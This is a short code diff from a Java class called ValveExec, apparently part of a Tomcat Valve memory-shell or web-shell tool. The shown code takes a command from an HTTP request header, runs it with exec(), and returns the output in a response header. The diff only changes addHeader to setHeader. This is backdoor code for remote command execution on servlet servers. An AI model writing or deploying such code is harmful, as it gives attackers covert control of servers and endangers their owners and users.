@@ -58,7 +58,7 @@ public class ValveExec implements InvocationHandler {
 
             Object header = invokeMethod(servletRequest, "getHeader", new Class[]{String.class}, new Object[]{HEADER});
             String result = exec((String) header);
-            invokeMethod(servletResponse, "addHeader", new Class[]{String.class, String.class}, new Object[]{RHEADER, result});
+            invokeMethod(servletResponse, "setHeader", new Class[]{String.class, String.class}, new Object[]{RHEADER, result});
 //            invokeMethod(servletResponse, "setStatus", new Class[]{Integer.TYPE}, new Object[]{new Integer(200)});
 //            Object writer = invokeMethod(servletResponse, "getWriter", new Class[]{}, new Object[]{});
 //            invokeMethod(writer, "println", new Class[]{String.class}, new Object[]{result});
